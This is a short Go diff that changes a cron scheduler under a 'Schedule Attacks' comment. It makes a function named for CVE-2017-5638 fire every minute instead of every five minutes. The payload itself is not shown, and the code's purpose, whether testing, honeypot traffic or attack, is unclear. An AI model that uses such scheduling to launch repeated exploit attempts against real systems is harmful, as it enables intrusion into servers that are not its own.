@@ -136,8 +136,10 @@ func (p *program) run() {
 	/* Schedule Attacks */
 	c = cron.New()
 
+	/* Every 1 minute */
+	c.AddFunc("0 */1 * * * *", func() { cve20175638.send() })	
+	
 	/* Every 5th minute */
-	c.AddFunc("0 */5 * * * *", func() { cve20175638.send() })
 
 	
 	/* REMOVE Every 10th minute */
